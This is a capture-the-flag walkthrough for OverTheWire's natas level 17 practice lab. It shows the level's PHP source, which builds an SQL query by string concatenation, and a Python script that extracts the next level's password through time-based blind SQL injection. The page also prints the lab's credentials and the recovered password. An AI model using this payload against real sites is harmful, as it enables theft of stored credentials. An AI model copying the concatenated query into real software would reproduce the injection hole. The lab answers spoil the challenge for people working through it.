---
title: natas 17 walkthrough
description: over the wire natas 17
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-17 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 17 walkthrough
    order: 30
---
## Description
> Username: natas17
> 
> URL:      http://natas17.natas.labs.overthewire.org
### Source Code
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if (array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
    if (array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }
    mysqli_close($link);
} else {
?>
```

---
## Progress
### Observation
Seems we cannot get anything different with different inputs. Try to see if it is true. It seems like that.
However, there's a line which output the query. Therefore, use the url `http://natas17.natas.labs.overthewire.org/?debug=true&username=a`.
### Trial
From this [article](https://security.stackexchange.com/questions/109415/php-code-injection-using-get-and-echo), it seems we can only achieve [[XSS]] via the only echo line. 
We cannot get anything different by the output. Time may be a way to distinguish the difference. [[Time Delay SQL Injection]]
### Script
```python
import requests
from bs4 import BeautifulSoup
from datetime import datetime

WAITING_TIME_SECONDS = 4

def request_with_password(password : str) -> bool:
    payload = f"natas18\" and if(password like binary \"{password}%\", sleep({WAITING_TIME_SECONDS}), 'no') -- "
    return request_with_payload(f"?debug=true&username={payload}")

def request_with_payload(payload: str):
    header = {
        "Authorization" : "Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==",
    }
    url = "http://natas17.natas.labs.overthewire.org/index.php"
    url += payload
    time_before_request = datetime.now()
    response = requests.get(url, headers=header)
    time_after_request = datetime.now()
    waiting_time = (time_after_request - time_before_request).total_seconds()
    return waiting_time > WAITING_TIME_SECONDS

def main():
    success_password = "8"
    letters = 'abcdefghijklmnopqrstuvwxyz'
    candidates = letters + letters.upper() + "0123456789"
    while True:
        for candidate in candidates:
            if request_with_password(success_password + candidate):
                success_password += candidate
                print(success_password)
                break
        else:
            print(f"password : {success_password}")
            break

main()
```
The script is awful, since the delay may differ from time to time due to the speed of internet.
One may want to check again when get a part of the password.
Still can find the password : 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

---
## Hint

---
## Solving
### Category
- 
### Techniques
- [[sql injection MOC]]

### Tools
- 